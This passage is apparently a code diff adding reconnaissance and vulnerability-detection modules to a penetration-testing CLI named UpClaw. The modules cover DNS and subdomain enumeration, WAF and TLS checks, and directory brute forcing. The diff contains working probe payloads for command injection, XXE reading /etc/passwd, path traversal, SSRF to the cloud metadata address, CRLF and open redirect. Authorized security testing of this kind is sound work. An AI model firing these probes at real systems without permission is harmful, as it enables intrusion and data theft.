@@ -1,4 +1,4 @@
-﻿#!/usr/bin/env python3
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """UpClaw — 渗透测试 CLI 工具（单文件版）。
 
@@ -1484,19 +1484,1183 @@ def _run_xss(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
 
 
 
+"""v0.2.0 能力扩展：DNS 枚举 / 子域扫描 / WAF 检测 / TLS 检测。"""
+
+import struct
+
+
+def _decode_dns_name(data: bytes, full: bytes) -> str:
+    """解析 DNS 域名（含压缩指针）。"""
+    labels: list[str] = []
+    i = 0
+    while i < len(data):
+        ln = data[i]
+        if ln == 0:
+            break
+        if ln & 0xC0 == 0xC0:  # 压缩指针
+            if i + 1 >= len(data):
+                break
+            ptr = ((ln & 0x3F) << 8) | data[i + 1]
+            rest = _decode_dns_name(full[ptr:], full)
+            return ".".join(labels) + ("." + rest if labels else rest)
+        i += 1
+        if i + ln > len(data):
+            break
+        labels.append(data[i : i + ln].decode("utf-8", errors="replace"))
+        i += ln
+    return ".".join(labels)
+
+
+def _dns_query(
+    host: str, qtype: int = 1, server: str = "8.8.8.8", timeout: float = 3.0
+) -> list[str]:
+    """手写 DNS 查询（UDP）。qtype: 1=A 15=MX 16=TXT 2=NS 6=SOA 28=AAAA。"""
+    try:
+        qid = random.randint(0, 65535)
+        header = struct.pack(">HHHHHH", qid, 0x0100, 1, 0, 0, 0)
+        qname = b"".join(bytes([len(l)]) + l.encode() for l in host.split(".")) + b"\x00"
+        question = qname + struct.pack(">HH", qtype, 1)
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(timeout)
+        s.sendto(header + question, (server, 53))
+        data, _ = s.recvfrom(4096)
+        s.close()
+        if len(data) < 12:
+            return []
+        ancount = struct.unpack(">H", data[6:8])[0]
+        if ancount == 0:
+            return []
+        off = 12
+        while data[off] != 0:
+            off += 1 + data[off]
+        off += 5  # 0x00 + qtype + qclass
+        results: list[str] = []
+        for _ in range(min(ancount, 30)):
+            if off >= len(data):
+                break
+            if data[off] & 0xC0 == 0xC0:
+                off += 2
+            else:
+                while off < len(data) and data[off] != 0:
+                    off += 1 + data[off]
+                off += 1
+            if off + 10 > len(data):
+                break
+            rtype, _, _, rdlen = struct.unpack(">HHIH", data[off : off + 10])
+            off += 10
+            if off + rdlen > len(data):
+                break
+            rdata = data[off : off + rdlen]
+            off += rdlen
+            if rtype == 1 and rdlen == 4:
+                results.append(".".join(str(b) for b in rdata))
+            elif rtype == 28 and rdlen == 16:
+                try:
+                    results.append(socket.inet_ntop(socket.AF_INET6, rdata))
+                except OSError:
+                    pass
+            elif rtype == 15 and rdlen >= 3:
+                pref = struct.unpack(">H", rdata[:2])[0]
+                results.append(f"{pref} {_decode_dns_name(rdata[2:], data)}")
+            elif rtype == 16:
+                txts: list[str] = []
+                i = 0
+                while i < len(rdata):
+                    ln = rdata[i]
+                    i += 1
+                    if i + ln > len(rdata):
+                        break
+                    txts.append(rdata[i : i + ln].decode("utf-8", errors="replace"))
+                    i += ln
+                results.append(" ".join(txts))
+            elif rtype in (2, 6, 12, 15):
+                results.append(_decode_dns_name(rdata, data))
+        return results
+    except (socket.timeout, OSError, IndexError):
+        return []
+
+
+SUBDOMAIN_WORDS = [
+    "www", "mail", "ftp", "api", "dev", "test", "staging", "beta", "demo", "admin",
+    "portal", "login", "app", "m", "mobile", "secure", "cdn", "static", "img", "images",
+    "assets", "shop", "store", "blog", "docs", "wiki", "status", "git", "ci", "jenkins",
+    "gitlab", "jira", "confluence", "vpn", "remote", "intranet", "internal", "ns1", "ns2",
+    "mx", "smtp", "pop", "imap", "webmail", "old", "new", "backup", "tmp", "db", "mysql",
+    "redis", "docker", "k8s", "monitor", "grafana", "kibana", "elastic", "search", "cdn2",
+    "web", "www2", "shop2", "auth", "oauth", "sso", "gateway", "proxy", "cache", "edge",
+]
+
+
+def _run_dns(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """DNS 记录枚举：A/AAAA/MX/NS/TXT/SOA。"""
+    host, _, _, _ = parse_target(url)
+    if not re.match(r"^[a-z0-9.-]+\.[a-z]{2,}$", host, re.I):
+        return  # 仅对域名执行
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.05)
+    limiter.wait()
+    records: dict[str, list[str]] = {}
+    for label, qtype in (("A", 1), ("AAAA", 28), ("MX", 15), ("NS", 2), ("TXT", 16), ("SOA", 6)):
+        r = _dns_query(host, qtype=qtype)
+        if r:
+            records[label] = r
+    if not records:
+        return
+    lines = "\n".join(f"  {k}: {', '.join(v[:8])}" for k, v in records.items())
+    store.add(
+        title=f"DNS 记录枚举（{host}）",
+        severity="INFO",
+        status="VERIFIED",
+        category="dns",
+        target=url,
+        location=host,
+        description="公开可查询的 DNS 记录，可用于扩大攻击面与信息收集。",
+        evidence=lines,
+        request=f"DNS query {host}",
+        impact="暴露邮件服务器(MX)、名称服务器(NS)、子域线索，辅助后续枚举。",
+        remediation="无需修复；此为公开信息收集。生产注意避免 TXT 中泄露内部信息。",
+        references=["https://owasp.org/www-community/attacks/Information_Gathering"],
+        cvss=0.0,
+    )
+
+
+def _run_subdomain(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """子域名枚举：内置字典 + DNS 解析验证。"""
+    host, _, _, _ = parse_target(url)
+    if not re.match(r"^[a-z0-9.-]+\.[a-z]{2,}$", host, re.I):
+        return
+    found: list[str] = []
+    threads = max(1, min(int(cfg.get("threads", 16)), 32))
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.02)
+
+    def probe(word: str) -> str | None:
+        limiter.wait()
+        sub = f"{word}.{host}"
+        try:
+            socket.gethostbyname(sub)
+            return sub
+        except socket.gaierror:
+            return None
+
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        for sub in ex.map(probe, SUBDOMAIN_WORDS):
+            if sub:
+                found.append(sub)
+    if not found:
+        return
+    store.add(
+        title=f"发现 {len(found)} 个存活子域名",
+        severity="INFO",
+        status="VERIFIED",
+        category="subdomain",
+        target=url,
+        location=host,
+        description="以下子域名可解析，可能暴露管理后台、内部系统或非公开服务：",
+        evidence="\n".join(f"  - {s}" for s in sorted(found)),
+        request=f"DNS resolve *.{host}",
+        impact="子域名常指向低防护环境（staging/dev/old），是横向渗透与信息收集的重点。",
+        remediation="清理不再使用的子域名，避免将敏感系统部署在易枚举的命名（如 admin/dev/old）。",
+        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage"],
+        cvss=0.0,
+    )
+
+
+WAF_BLOCK_SIGS = [
+    "captcha", "access denied", "access denied by rule", "blocked", "challenge",
+    "mod_security", "modsecurity", "cloudflare", "cf-ray", "our systems have detected",
+    "request blocked", "security check", "rate limit", "too many requests",
+    "waf", "virtual patch", "forbidden by policy", "denied by waf", "rejected by policy",
+]
+WAF_HEADERS = ["cf-ray", "x-waf", "x-sucuri-id", "x-powered-by-plesk", "x-qooxdoo-response-type"]
+
+
+def _run_waf(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """WAF 检测：恶意载荷探测 + 拦截特征识别。"""
+    base_url = url.split("?")[0]
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
+    probes = {
+        "SQLi": f"{base_url}?id=1' AND '1'='1",
+        "XSS": f"{base_url}?q=<script>alert(1)</script>",
+        "LFI": f"{base_url}?file=../../../../etc/passwd",
+        "CMDi": f"{base_url}?cmd=;id",
+    }
+    baseline = _get(url, cfg, limiter)
+    if not baseline.ok:
+        return
+    blocked: list[str] = []
+    for name, purl in probes.items():
+        r = _get(purl, cfg, limiter)
+        if not r.ok:
+            continue
+        low = (r.body or "").lower()
+        hit_sig = any(s in low for s in WAF_BLOCK_SIGS)
+        hit_hdr = any(k.lower() in {h.lower() for h in r.headers} for k in WAF_HEADERS)
+        status_diff = r.status != baseline.status and r.status in (403, 406, 429, 444, 500)
+        if hit_sig or hit_hdr or status_diff:
+            blocked.append(name)
+    if not blocked:
+        return
+    store.add(
+        title=f"检测到 WAF 拦截行为（{', '.join(blocked)}）",
+        severity="INFO",
+        status="VERIFIED",
+        category="waf",
+        target=url,
+        location=url,
+        description="发送攻击特征载荷时触发拦截，说明目标部署了 WAF/应用防火墙：",
+        evidence="触发类别: " + ", ".join(blocked),
+        request="GET " + base_url + " (恶意载荷探测)",
+        impact="WAF 会拦截常规漏洞测试载荷，需在授权范围内绕过/调整测试策略；"
+               "同时表明目标有一定安全防护。",
+        remediation="无修复项（防护措施）。测试时注意载荷编码方式以降低误报。",
+        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework"],
+        cvss=0.0,
+    )
+
+
+def _run_tls(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """TLS 检测：协议版本、证书有效期、自签名、主机名匹配。"""
+    host, port, scheme, _ = parse_target(url)
+    if scheme != "https":
+        store.add(
+            title="站点未启用 HTTPS",
+            severity="MEDIUM",
+            status="VERIFIED",
+            category="tls",
+            target=url,
+            location=url,
+            description="目标通过明文 HTTP 提供服务，未强制 HTTPS。",
+            evidence=f"scheme=http port={port}",
+            request=f"GET {url}",
+            impact="传输内容可被中间人窃听或篡改，登录凭据等敏感信息存在泄露风险。",
+            remediation="配置 TLS 证书并强制 HTTPS（301 跳转 + HSTS）。",
+            references=["https://owasp.org/www-project-secure-headers/#div-strict-transport-security"],
+            cvss=5.9,
+        )
+        return
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    try:
+        with socket.create_connection((host, port or 443), timeout=float(cfg.get("timeout", 6.0))) as raw:
+            with ctx.wrap_socket(raw, server_hostname=host) as s:
+                ver = s.version() or "unknown"
+                cert = s.getpeercert()
+                cipher = s.cipher()
+    except (ssl.SSLError, OSError, socket.timeout) as e:
+        store.add(
+            title="TLS 握手失败",
+            severity="MEDIUM",
+            status="VERIFIED",
+            category="tls",
+            target=url,
+            location=url,
+            description=f"与目标 TLS 握手失败：{e}",
+            evidence=str(e),
+            request=f"TLS handshake {host}:{port or 443}",
+            impact="可能存在证书配置错误、协议不兼容或服务异常。",
+            remediation="检查服务器证书链与支持的 TLS 版本。",
+            references=["https://owasp.org/www-community/vulnerabilities/Insecure_Transport"],
+            cvss=5.0,
+        )
+        return
+    cert_info = f"protocol={ver} cipher={cipher}"
+    findings: list[dict[str, Any]] = []
+    if ver and ver < "TLSv1.2":
+        findings.append(
+            {
+                "title": f"TLS 协议版本过旧（{ver}）",
+                "severity": "HIGH",
+                "desc": f"目标协商使用 {ver}，存在已知加密弱点。",
+                "cvss": 7.4,
+            }
+        )
+    if cert:
+        try:
+            from datetime import datetime as _dt
+            not_before = cert.get("notBefore", "")
+            not_after = cert.get("notAfter", "")
+            try:
+                exp = _dt.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
+                if exp < _dt.utcnow():
+                    findings.append(
+                        {
+                            "title": "TLS 证书已过期",
+                            "severity": "HIGH",
+                            "desc": f"证书有效期至 {not_after}，已过期。",
+                            "cvss": 7.4,
+                        }
+                    )
+                elif (exp - _dt.utcnow()).days < 30:
+                    findings.append(
+                        {
+                            "title": "TLS 证书即将过期",
+                            "severity": "LOW",
+                            "desc": f"证书将在 {exp.date()} 过期。",
+                            "cvss": 3.1,
+                        }
+                    )
+            except ValueError:
+                pass
+            san = []
+            for entry in cert.get("subjectAltName", ()):
+                san.append(entry[1])
+            if san and host not in san and not any(host.endswith("." + s.lstrip("*.")) for s in san):
+                findings.append(
+                    {
+                        "title": "TLS 证书与域名不匹配",
+                        "severity": "MEDIUM",
+                        "desc": f"证书 SAN 为 {san}，不含目标域名 {host}。",
+                        "cvss": 5.9,
+                    }
+                )
+        except Exception:
+            pass
+    else:
+        findings.append(
+            {
+                "title": "TLS 证书缺失或无法解析",
+                "severity": "MEDIUM",
+                "desc": "握手成功但未能解析对端证书，可能为自签名证书。",
+                "cvss": 5.0,
+            }
+        )
+    for f in findings:
+        store.add(
+            title=f["title"],
+            severity=f["severity"],
+            status="VERIFIED",
+            category="tls",
+            target=url,
+            location=f"{host}:{port or 443}",
+            description=f["desc"],
+            evidence=cert_info,
+            request=f"TLS handshake {host}:{port or 443}",
+            impact="TLS 配置缺陷可被降级或中间人利用，削弱传输保密性与完整性。",
+            remediation="升级 TLS 至 1.2+，配置受信任 CA 证书并保证主机名匹配，开启 HSTS。",
+            references=["https://owasp.org/www-project-transport-layer-protection/"],
+            cvss=f["cvss"],
+        )
+    if not findings:
+        store.add(
+            title=f"TLS 配置正常（{ver}）",
+            severity="INFO",
+            status="VERIFIED",
+            category="tls",
+            target=url,
+            location=f"{host}:{port or 443}",
+            description="TLS 版本与证书校验未发现明显问题。",
+            evidence=cert_info,
+            request=f"TLS handshake {host}:{port or 443}",
+            impact="无。",
+            remediation="保持定期更新证书与 TLS 配置。",
+            references=["https://owasp.org/www-project-transport-layer-protection/"],
+            cvss=0.0,
+        )
+
+
+"""v0.2.0 漏洞验证：命令注入 / SSRF / XXE / 文件包含 / 开放重定向 / CRLF 注入。"""
+
+# 命令注入回显特征（匹配 Linux/macOS/Windows 命令执行结果）
+CMDI_ECHO_SIGS = [
+    "uid=", "gid=", "uid=", "root:x:0:0", "linux", "windows",
+]
+CMDI_PAYLOADS = [";id", "|id", ";whoami", "|whoami", "`id`", "$(id)"]
+
+
+def _run_cmdi(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """命令注入初检（回显型）。"""
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
+    base = _get(url, cfg, limiter)
+    if not base.ok:
+        return
+    base_low = (base.body or "").lower()
+    for key, orig in params:
+        for payload in CMDI_PAYLOADS:
+            test_url = _build(url, key, orig + payload)
+            r = _get(test_url, cfg, limiter)
+            if not r.ok:
+                continue
+            low = (r.body or "").lower()
+            hit = [s for s in CMDI_ECHO_SIGS if s in low and s not in base_low]
+            if hit:
+                store.add(
+                    title=f"命令注入（回显型）— 参数 `{key}`",
+                    severity="CRITICAL",
+                    status="VERIFIED",
+                    category="cmdi",
+                    target=url,
+                    location=f"参数 {key}",
+                    description=f"向参数 `{key}` 注入命令分隔符后，响应中出现了命令执行输出特征"
+                                f"（{hit[0]}），说明用户输入被传递到系统命令执行。",
+                    evidence=_extract_snippet(r.body),
+                    request=f"GET {test_url}",
+                    impact="攻击者可执行任意系统命令，完全控制服务器（RCE）。",
+                    remediation="禁止将用户输入拼接到系统命令；使用参数化调用或白名单校验；"
+                                "最小权限运行应用进程。",
+                    references=["https://owasp.org/www-community/attacks/Command_Injection"],
+                    cvss=9.8,
+                )
+                break  # 已确认则不再探测该参数
+
+
+SSRF_ECHO_SIGS = [
+    "127.0.0.1", "localhost", "0.0.0.0", "169.254.169.254", "10.", "172.16.", "192.168.",
+]
+
+
+def _run_ssrf(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """SSRF 初检：向参数注入内网回环地址，检测响应内容差分。"""
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
+    base = _get(url, cfg, limiter)
+    if not base.ok:
+        return
+    base_low = (base.body or "").lower()
+    for key, orig in params:
+        for target_url in ("http://127.0.0.1/", "http://127.0.0.1:8080/", "http://169.254.169.254/latest/meta-data/"):
+            test_url = _build(url, key, target_url)
+            r = _get(test_url, cfg, limiter)
+            if not r.ok:
+                continue
+            low = (r.body or "").lower()
+            hit = [s for s in SSRF_ECHO_SIGS if s in low and s not in base_low]
+            # 内容显著变化也可能代表服务端发起了请求（如返回了内网默认页特征）
+            if hit:
+                store.add(
+                    title=f"SSRF — 参数 `{key}` 可访问内网地址",
+                    severity="HIGH",
+                    status="VERIFIED",
+                    category="ssrf",
+                    target=url,
+                    location=f"参数 {key}",
+                    description=f"向参数 `{key}` 注入内网地址 {target_url} 后，响应出现内网/回环特征"
+                                f"（{hit[0]}），服务端可能对注入地址发起了请求。",
+                    evidence=_extract_snippet(r.body),
+                    request=f"GET {test_url}",
+                    impact="可利用服务器访问内网服务、云元数据接口（如 169.254.169.254）或读取内部资源。",
+                    remediation="对 URL 类参数做协议与主机白名单校验，禁止访问内网地址与云元数据接口；"
+                                "使用 SSRF 防护库或代理过滤。",
+                    references=["https://owasp.org/www-community/attacks/Server_Side_Request_Forgery"],
+                    cvss=8.8,
+                )
+                break
+        else:
+            continue
+        break
+
+
+XXE_MARKERS = ["xxe-test-", "ENTITY"]
+
+
+def _run_xxe(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """XXE 初检：向目标发送含外部实体的 XML 载荷，检测实体内容回显。"""
+    base_url = url.split("?")[0]
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.1)
+    entity = "xxe" + "".join(random.choice(string.ascii_lowercase) for _ in range(5))
+    payloads = [
+        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {entity} SYSTEM "file:///etc/passwd">]><root>&{entity};</root>""",
+        f"""<?xml version="1.0"?><!DOCTYPE root [<!ENTITY {entity} SYSTEM "file:///c:/windows/win.ini">]><root>&{entity};</root>""",
+    ]
+    for payload in payloads:
+        try:
+            r = http_request(
+                base_url,
+                method="POST",
+                headers={"Content-Type": "application/xml"},
+                body=payload,
+                timeout=float(cfg.get("timeout", 6.0)),
+                follow_redirects=bool(cfg.get("follow_redirects", True)),
+                verify_tls=bool(cfg.get("verify_tls", False)),
+                user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
+            )
+        except Exception:
+            continue
+        if not r.ok:
+            continue
+        low = (r.body or "").lower()
+        if "root:x:0:0" in low or "[fonts]" in low or "for 16-bit" in low:
+            store.add(
+                title="XXE — 外部实体注入成功",
+                severity="HIGH",
+                status="VERIFIED",
+                category="xxe",
+                target=url,
+                location=base_url,
+                description="向目标提交含外部实体（file://）的 XML 载荷后，响应中回显了本地文件内容，"
+                            "说明 XML 解析器未禁用外部实体。",
+                evidence=_extract_snippet(r.body),
+                request=f"POST {base_url}\nContent-Type: application/xml\n\n{payload[:200]}",
+                impact="可读取服务器本地文件（含配置与密钥）、发起内网请求，甚至 RCE。",
+                remediation="禁用 XML 解析器的外部实体（XXE）与 DTD 处理；使用安全解析库（如 defusedxml）。",
+                references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+                cvss=8.3,
+            )
+            return
+    # 若解析器报实体引用错误，说明接受了 XML 输入但禁用了外部实体——记录为低风险信息
+    for payload in payloads:
+        try:
+            r = http_request(
+                base_url,
+                method="POST",
+                headers={"Content-Type": "application/xml"},
+                body=payload,
+                timeout=float(cfg.get("timeout", 6.0)),
+                follow_redirects=bool(cfg.get("follow_redirects", True)),
+                verify_tls=bool(cfg.get("verify_tls", False)),
+                user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
+            )
+        except Exception:
+            continue
+        if r.ok and ("&" + entity + ";" in (r.body or "")) and ("DOCTYPE" not in (r.body or "")):
+            store.add(
+                title="目标接受 XML 输入（XXE 防御待确认）",
+                severity="INFO",
+                status="UNVERIFIED",
+                category="xxe",
+                target=url,
+                location=base_url,
+                description="目标接受 XML 请求体，外部实体未回显（可能已禁用），建议人工复核解析器配置。",
+                evidence="XML 输入被接受但未回显实体内容",
+                request=f"POST {base_url}",
+                impact="如实体被禁用则风险有限；需人工确认解析器安全配置。",
+                remediation="确保 XML 解析器禁用 DTD/外部实体。",
+                references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing"],
+                cvss=0.0,
+            )
+            return
+
+
+LFI_MARKERS = ["root:x:0:0", "daemon:x:1:1", "[fonts]", "boot loader", "for 16-bit"]
+LFI_PAYLOADS = [
+    "../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "..%2f..%2f..%2f..%2fetc/passwd",
+    "..%2f..%2f..%2fwindows/win.ini",
+    "..\\..\\..\\..\\windows\\win.ini",
+    "/etc/passwd",
+]
+
+
+def _run_lfi(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """本地文件包含（LFI）初检：路径遍历载荷 + 文件内容特征。"""
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
+    base = _get(url, cfg, limiter)
+    if not base.ok:
+        return
+    base_low = (base.body or "").lower()
+    for key, orig in params:
+        for payload in LFI_PAYLOADS:
+            test_url = _build(url, key, payload)
+            r = _get(test_url, cfg, limiter)
+            if not r.ok:
+                continue
+            low = (r.body or "").lower()
+            hit = [m for m in LFI_MARKERS if m in low and m not in base_low]
+            if hit:
+                store.add(
+                    title=f"本地文件包含（LFI）— 参数 `{key}`",
+                    severity="HIGH",
+                    status="VERIFIED",
+                    category="lfi",
+                    target=url,
+                    location=f"参数 {key}",
+                    description=f"向参数 `{key}` 注入路径遍历载荷后，响应中出现本地文件内容特征"
+                                f"（{hit[0]}），可读取服务器文件。",
+                    evidence=_extract_snippet(r.body),
+                    request=f"GET {test_url}",
+                    impact="可读取服务器本地敏感文件（/etc/passwd、配置文件、源码），"
+                           "结合日志注入可升级为 RCE。",
+                    remediation="对文件包含参数做白名单校验，禁止路径穿越字符（../），"
+                                "使用固定目录 + 哈希命名。",
+                    references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_File_Inclusion"],
+                    cvss=8.1,
+                )
+                break
+        else:
+            continue
+        break
+
+
+REDIRECT_PARAMS = ["next", "url", "redirect", "return", "return_url", "dest", "redir", "target", "rurl", "continue"]
+REDIRECT_EXTERNAL = "https://example.com/"
+REDIRECT_EXTERNAL_HOST = "example.com"
+
+
+def _run_open_redirect(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """开放重定向初检：注入外部链接，检测 Location 头反射。"""
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
+    for key, orig in params:
+        if key.lower() not in REDIRECT_PARAMS:
+            continue
+        test_url = _build(url, key, REDIRECT_EXTERNAL)
+        r = http_request(
+            test_url,
+            timeout=float(cfg.get("timeout", 6.0)),
+            follow_redirects=False,
+            verify_tls=bool(cfg.get("verify_tls", False)),
+            user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
+        )
+        loc = r.header("Location") or ""
+        if r.status in (301, 302, 303, 307, 308) and REDIRECT_EXTERNAL_HOST in loc:
+            store.add(
+                title=f"开放重定向 — 参数 `{key}`",
+                severity="MEDIUM",
+                status="VERIFIED",
+                category="open-redirect",
+                target=url,
+                location=f"参数 {key}",
+                description=f"参数 `{key}` 接受外部 URL 并 30x 跳转到 {loc}，可用于钓鱼攻击。",
+                evidence=f"HTTP {r.status}\nLocation: {loc}",
+                request=f"GET {test_url}",
+                impact="攻击者可构造看似可信的链接将用户重定向到钓鱼站点，窃取凭据。",
+                remediation="对跳转 URL 做白名单域名校验，仅允许站内相对路径跳转。",
+                references=["https://owasp.org/www-community/attacks/URL_Redirector_Abuse"],
+                cvss=4.7,
+            )
+            break
+
+
+CRLF_HEADER = "X-UpClaw-Injected"
+
+
+def _run_crlf(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """CRLF 注入初检：向参数注入 %0d%0a，检测响应头拆分。"""
+    parsed = urllib.parse.urlparse(url)
+    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
+    if not params:
+        return
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.08)
+    for key, orig in params:
+        payload = f"%0d%0a{CRLF_HEADER}: 1"
+        test_url = _build(url, key, orig + payload)
+        try:
+            r = http_request(
+                test_url,
+                timeout=float(cfg.get("timeout", 6.0)),
+                follow_redirects=False,
+                verify_tls=bool(cfg.get("verify_tls", False)),
+                user_agent=str(cfg.get("user_agent", "UpClaw/0.1.0")),
+            )
+        except Exception:
+            continue
+        if not r.ok:
+            continue
+        if any(k.lower() == CRLF_HEADER.lower() for k in r.headers):
+            store.add(
+                title=f"CRLF 注入 — 参数 `{key}`",
+                severity="MEDIUM",
+                status="VERIFIED",
+                category="crlf",
+                target=url,
+                location=f"参数 {key}",
+                description=f"参数 `{key}` 中注入 %0d%0a 后成功拆分响应头并注入 {CRLF_HEADER} 头，"
+                            "存在响应拆分/会话固定风险。",
+                evidence=f"检测到注入响应头: {CRLF_HEADER}: 1",
+                request=f"GET {test_url}",
+                impact="可注入任意响应头，进行会话固定、XSS（配合刷新头）或绕过安全机制。",
+                remediation="对用户输入做严格过滤，拒绝 CR/LF（%0d/%0a）字符；输出时编码。",
+                references=["https://owasp.org/www-community/attacks/HTTP_Response_Splitting"],
+                cvss=5.3,
+            )
+            break
+
+
+"""v0.2.0 暴力破解类：目录爆破 / 备份文件扫描 / 参数模糊测试。"""
+
+# 目录爆破字典（覆盖管理、技术栈、API、文件、环境类路径）
+DIR_WORDS = [
+    "admin", "administrator", "login", "signin", "auth", "oauth", "sso", "register",
+    "account", "user", "users", "profile", "dashboard", "panel", "console", "manage",
+    "backup", "bak", "temp", "tmp", "test", "tests", "demo", "dev", "staging", "old",
+    "www", "web", "public", "private", "internal", "api", "v1", "v2", "v3", "graphql",
+    "rest", "swagger", "swagger-ui", "swagger-ui.html", "api-docs", "docs", "documentation",
+    "doc", "help", "guide", "manual", "readme", "about", "contact", "faq", "status",
+    "health", "healthz", "metrics", "monitor", "debug", "trace", "log", "logs", "error",
+    "uploads", "upload", "download", "downloads", "files", "file", "images", "img", "assets",
+    "static", "css", "js", "scripts", "media", "data", "db", "database", "sql", "dump",
+    "config", "conf", "settings", "setup", "install", "phpinfo", "info", "server-status",
+    "server-info", "wp-admin", "wp-content", "wp-includes", "administrator", "manager",
+    "actuator", "actuator/env", "console", "jenkins", "git", ".git", ".svn", ".hg",
+    "phpmyadmin", "adminer", "webmail", "mail", "cgi-bin", "icons", "pma", "dbadmin",
+    "robots.txt", "sitemap.xml", "crossdomain.xml", ".env", ".well-known", "weblogic",
+    "tomcat", "manager/html", "host-manager", "drupal", "joomla", "laravel", "django",
+]
+BACKUP_SUFFIXES = [".bak", ".zip", ".tar", ".tar.gz", ".gz", ".sql", ".old", ".orig", ".save", ".swp", "~", ".txt", ".conf", ".config", ".log", ".yml", ".yaml", ".json", ".ini", ".php~"]
+
+
+def _run_dir(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """目录爆破：内置字典并发探测，状态码分级。"""
+    base_url = url.split("?")[0].rstrip("/")
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.03)
+    threads = max(1, min(int(cfg.get("threads", 16)), 32))
+    base = _get(base_url, cfg, limiter)
+    base_status = base.status if base.ok else 0
+
+    def probe(path: str) -> dict[str, Any] | None:
+        limiter.wait()
+        r = _get(f"{base_url}/{path}", cfg, limiter)
+        if not r.ok:
+            return None
+        if r.status == base_status:
+            return None  # 与基线相同，大概率是统一 404 页面
+        if r.status in (200, 301, 302, 307, 308, 401, 403, 500):
+            return {"path": path, "status": r.status, "loc": r.header("Location") or "", "len": len(r.body or "")}
+        return None
+
+    found: list[dict[str, Any]] = []
+    with ThreadPoolExecutor(max_workers=threads) as ex:
+        for res in ex.map(probe, DIR_WORDS):
+            if res:
+                found.append(res)
+    if not found:
+        return
+    lines = "\n".join(f"  {f['status']}  /{f['path']}" + (f"  → {f['loc']}" if f["loc"] else "") for f in found[:30])
+    risky = [f for f in found if f["path"].startswith((".git", ".svn", ".env", "admin", "phpmyadmin", "actuator"))]
+    store.add(
+        title=f"目录爆破：发现 {len(found)} 个可访问路径",
+        severity="HIGH" if risky else "MEDIUM",
+        status="VERIFIED",
+        category="dir",
+        target=url,
+        location=base_url,
+        description="通过字典爆破发现以下可访问路径（状态码与基线不同）：",
+        evidence=lines,
+        request=f"GET {base_url}/<word> (共探测 {len(DIR_WORDS)} 个路径)",
+        impact="暴露管理后台、源码目录（.git/.svn）、配置或敏感端点，扩大攻击面。",
+        remediation="移除或保护敏感路径；对不存在的路径返回统一 404；"
+                    "限制管理入口访问（IP 白名单/二次认证）。",
+        references=["https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Webpage_Content_for_Information_Leakage"],
+        cvss=5.3 if not risky else 7.5,
+    )
+
+
+def _run_backup(store: FindingStore, url: str, cfg: dict[str, Any]) -> None:
+    """备份文件扫描：对常见文件探测备份/泄漏后缀。"""
+    base_url = url.split("?")[0].rstrip("/")
+    limiter = RateLimiter(float(cfg.get("rate_limit", 0.0)) or 0.03)
+    threads = max(1, min(int(cfg.get("threads", 16)), 32))
+    base = _get(base_url, cfg, limiter)
+    base_status = base.status if base.ok else 0
+    # 探测基础文件名的各种备份变体
+    candidates = ["config.php", "index.php", "db", "database", "backup", "config", "settings", "wp-config.php", "admin", "site", "app", "data", "main", ".env"]
+    targets: list[str] = []
+    for c in candidates:
+        for sfx in BACKUP_SUFFIXES:
+            targets.append(f"{c}{sfx}")
+    # 过滤掉与字典重复的纯文件（避免与 dir 重复）；此处专注备份后缀
+    targets = [t for t in targets if t != "backup"]
+
